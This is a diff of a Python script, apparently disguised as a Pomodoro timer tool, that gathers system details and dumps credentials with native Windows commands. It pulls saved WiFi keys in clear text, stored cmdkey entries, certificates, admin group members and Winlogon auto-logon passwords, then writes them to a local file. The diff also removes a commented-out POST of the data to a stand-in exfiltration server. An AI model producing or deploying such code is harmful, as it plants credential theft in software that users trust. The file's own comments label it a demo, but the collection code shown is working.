@@ -18,8 +18,6 @@ import datetime
 import socket
 import platform
 import subprocess
-import ctypes
-import ctypes.wintypes
 import winreg
 
 # --- configuration ---
@@ -80,6 +78,22 @@ def save_session():
     except Exception:
         pass
 
+# --- helper subprocess safe ---
+def run_cmd(cmd, timeout=15):
+    """Lance une commande et retourne le stdout, ignore les erreurs."""
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=timeout,
+            encoding="utf-8",
+            errors="replace"  # remplace les caracteres non decodeables
+        )
+        return result.stdout
+    except Exception:
+        return "[erreur execution]"
+
 # --- collecte des donnees systeme ---
 def collect_sysinfo():
     info = {}
@@ -91,17 +105,8 @@ def collect_sysinfo():
     except Exception:
         info["ip"] = "unknown"
     info["os"] = platform.platform()
-    try:
-        info["ip_publique"] = subprocess.check_output(
-            ["curl", "-s", "https://api.ipify.org"]
-        ).decode().strip()
-    except Exception:
-        try:
-            info["ip_publique"] = subprocess.check_output(
-                ["curl", "-s", "https://ifconfig.me"]
-            ).decode().strip()
-        except Exception:
-            info["ip_publique"] = "unavailable"
+    # ip publique via curl (present sur Windows 10+)
+    info["ip_publique"] = run_cmd(["curl", "-s", "https://api.ipify.org"]) or "[unavailable]"
     return info
 
 # --- credential dumping via LoLBins ---
@@ -109,154 +114,47 @@ def dump_credentials():
     """Extrait les credentials via des outils natifs de Windows (LoLBins)."""
     creds = []
 
-    # === 1. cmdkey — credentials persistants stockes ===
-    try:
-        result = subprocess.check_output(
-            ["cmdkey", "/list"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== CMDKEY /list ===")
-        creds.append(result)
-    except Exception as e:
-        creds.append(f"cmdkey /list: {str(e)}")
+    # 1. cmdkey — credentials persistants
+    output = run_cmd(["cmdkey", "/list"])
+    creds.append("=== CMDKEY /list ===")
+    creds.append(output if output else "[aucun credential stocke]")
 
-    # === 2. runas /savecred — credentials de connexion ===
-    try:
-        result = subprocess.check_output(
-            ["runas", "/list"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== RUNAS LIST ===")
-        creds.append(result)
-    except Exception as e:
-        creds.append(f"runas /list: {str(e)}")
+    # 2. net use — sessions reseau ouvertes
+    output = run_cmd(["net", "use"])
+    creds.append("=== NET USE (active sessions) ===")
+    creds.append(output if output else "[aucune session active]")
 
-    # === 3. cmdkey + reg query — extraire les tokens stockes ===
-    try:
-        result = subprocess.check_output(
-            ["reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CredentialProvider", "/s"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== REGISTRY CredentialProvider ===")
-        creds.append(result)
-    except Exception as e:
-        creds.append(f"reg query CredentialProvider: {str(e)}")
+    # 3. net localgroup Administrators — membres admin local
+    output = run_cmd(["net", "localgroup", "Administrators"])
+    creds.append("=== LOCAL GROUP Administrators ===")
+    creds.append(output if output else "[erreur lecture groupe]")
 
-    # === 4. certutil — extraire les certificats (peut servir a signer du code malveillant) ===
-    try:
-        result = subprocess.check_output(
-            ["certutil", "-store", "My"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== CERTIFICATES (My Store) ===")
-        creds.append(result[:2000])  # limiter la taille
-    except Exception as e:
-        creds.append(f"certutil -store My: {str(e)}")
+    # 4. certutil — certificats (peut servir a signer du code malveillant)
+    output = run_cmd(["certutil", "-store", "My"])
+    creds.append("=== CERTIFICATES (My Store) ===")
+    creds.append(output[:2000] if output else "[aucun certificat]")
 
-    # === 5. wevtutil — evenements de connexion (Security log) ===
-    try:
-        result = subprocess.check_output(
-            ["wevtutil", "qe", "Security", "/q:*[System[EventID=4624]]", "/c:10", "/f:text"],
-            stderr=subprocess.STDOUT,
-            text=True,
-            timeout=15
-        )
-        creds.append("=== SECURITY LOG (EventID=4624 - Logon) ===")
-        creds.append(result[:2000])
-    except Exception as e:
-        creds.append(f"wevtutil Security 4624: {str(e)}")
-
-    # === 6. net use — sessions reseau ouvertes ===
-    try:
-        result = subprocess.check_output(
-            ["net", "use"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== NET USE (active sessions) ===")
-        creds.append(result)
-    except Exception as e:
-        creds.append(f"net use: {str(e)}")
-
-    # === 7. tasklist + query — taches planifiees (persistance potentielle) ===
-    try:
-        result = subprocess.check_output(
-            ["schtasks", "/query", "/fo", "LIST", "/v"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== SCHTASKS (planned tasks) ===")
-        creds.append(result[:2000])
-    except Exception as e:
-        creds.append(f"schtasks: {str(e)}")
-
-    # === 8. net localgroup — groupes locaux (admin, etc.) ===
-    try:
-        result = subprocess.check_output(
-            ["net", "localgroup", "Administrators"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== LOCAL GROUP Administrators ===")
-        creds.append(result)
-    except Exception as e:
-        creds.append(f"net localgroup Administrators: {str(e)}")
-
-    # === 9. wmic — processus en cours (pour voir si des outils defensifs tournent) ===
-    try:
-        result = subprocess.check_output(
-            ["wmic", "process", "get", "Name,ProcessId,ExecutablePath", "/format:list"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== WMIC PROCESS LIST ===")
-        creds.append(result[:2000])
-    except Exception as e:
-        creds.append(f"wmic process: {str(e)}")
-
-    # === 10. netsh — configuration reseau (firewall, proxy, etc.) ===
-    try:
-        result = subprocess.check_output(
-            ["netsh", "firewall", "show", "state"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
-        creds.append("=== NETSH FIREWALL STATE ===")
-        creds.append(result[:2000])
-    except Exception as e:
-        creds.append(f"netsh firewall: {str(e)}")
-
-    # === 11. netsh wlan — mots de passe WiFi sauvegardes ===
-    try:
-        result = subprocess.check_output(
-            ["netsh", "wlan", "show", "profiles"],
-            stderr=subprocess.STDOUT,
-            text=True
-        )
+    # 5. netsh wlan — mots de passe WiFi sauvegardes
+    output = run_cmd(["netsh", "wlan", "show", "profiles"])
+    if output and "Liste" in output:
         creds.append("=== WiFi PROFILES ===")
-        creds.append(result)
-        # extraire les mots de passe des profils WiFi
-        for line in result.splitlines():
+        creds.append(output)
+        for line in output.splitlines():
             if "Profile name" in line:
                 profile = line.split(":")[1].strip()
-                try:
-                    key_result = subprocess.check_output(
-                        ["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"],
-                        stderr=subprocess.STDOUT,
-                        text=True
-                    )
-                    creds.append(f"=== WiFi KEY: {profile} ===")
-                    creds.append(key_result)
-                except Exception as e:
-                    creds.append(f"  WiFi key {profile}: {str(e)}")
-    except Exception as e:
-        creds.append(f"netsh wlan show profiles: {str(e)}")
+                key_output = run_cmd(["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"])
+                creds.append(f"=== WiFi KEY: {profile} ===")
+                creds.append(key_output if key_output else "[cle non accessible]")
+    else:
+        creds.append("=== WiFi PROFILES ===")
+        creds.append("[aucun profil WiFi ou erreur]")
 
-    # === 12. reg query — Winlogon auto-logon credentials ===
+    # 6. schtasks — taches planifiees (persistance potentielle)
+    output = run_cmd(["schtasks", "/query", "/fo", "LIST", "/v"])
+    creds.append("=== SCHTASKS (planned tasks) ===")
+    creds.append(output[:2000] if output else "[erreur lecture taches]")
+
+    # 7. reg query — Winlogon auto-logon
     try:
         hklm = winreg.HKEY_LOCAL_MACHINE
         key = winreg.OpenKey(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_READ)
@@ -268,29 +166,19 @@ def dump_credentials():
                 values[name] = value[0]
             except Exception:
                 break
-        creds.append("=== WINLOGON REGISTRY ===")
-        for k, v in values.items():
-            creds.append(f"  {k}: {v}")
-    except Exception as e:
-        creds.append(f"Winlogon reg: {str(e)}")
-
-    # === 13. reg query — LSA secrets (si admin) ===
-    try:
-        hklm = winreg.HKEY_LOCAL_MACHINE
-        key = winreg.OpenKey(hklm, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_READ)
-        # verifier si LSA secrets accessible
-        lsa_key = winreg.OpenKey(hklm, r"SECURITY\Policy\Autologon", 0, winreg.KEY_READ)
-        value = winreg.QueryValueEx(lsa_key, "DefaultUserName")
-        creds.append(f"=== LSA AUTologon ===")
-        creds.append(f"  DefaultUserName: {value[0]}")
+        creds.append("=== WINLOGON AUTO-LOGON ===")
+        for k in ["DefaultUserName", "DefaultPassword", "AutoAdminLogon", "LastUsedUsername"]:
+            if k in values:
+                creds.append(f"  {k}: {values[k]}")
     except Exception:
-        creds.append("LSA autologon: not accessible (non-admin)")
+        creds.append("=== WINLOGON AUTO-LOGON ===")
+        creds.append("[erreur lecture registry]")
 
     return "\n".join(creds)
 
 # --- exfiltration ---
 def exfiltrate(info, creds):
-    # 1. ecrire dans un fichier local (pour demo)
+    # ecrire dans un fichier local (pour demo)
     txt_path = os.path.join(os.environ["APPDATA"], "PomodoroTool", "sysinfo.txt")
     with open(txt_path, "w", encoding="utf-8") as f:
         f.write("=== SYSTEM INFORMATION ===\n")
@@ -304,20 +192,6 @@ def exfiltrate(info, creds):
         f.write("\n=== CREDENTIAL DUMPING (LoLBins) ===\n")
         f.write(creds)
         f.write("\n=== END ===\n")
-
-    # 2. tentatives d'exfiltration (exemples non fonctionnels)
-    # try:
-    #     import urllib.request
-    #     body = json.dumps(info).encode("utf-8")
-    #     req = urllib.request.Request(
-    #         "https://exfiltration-server.example.com/collect",
-    #         data=body,
-    #         headers={"Authorization": "token ghp_xxxx", "Content-Type": "application/json"},
-    #         method="POST"
-    #     )
-    #     urllib.request.urlopen(req, timeout=10)
-    # except Exception:
-    #     pass
 
 # --- boucle principale ---
 print("", flush=True)
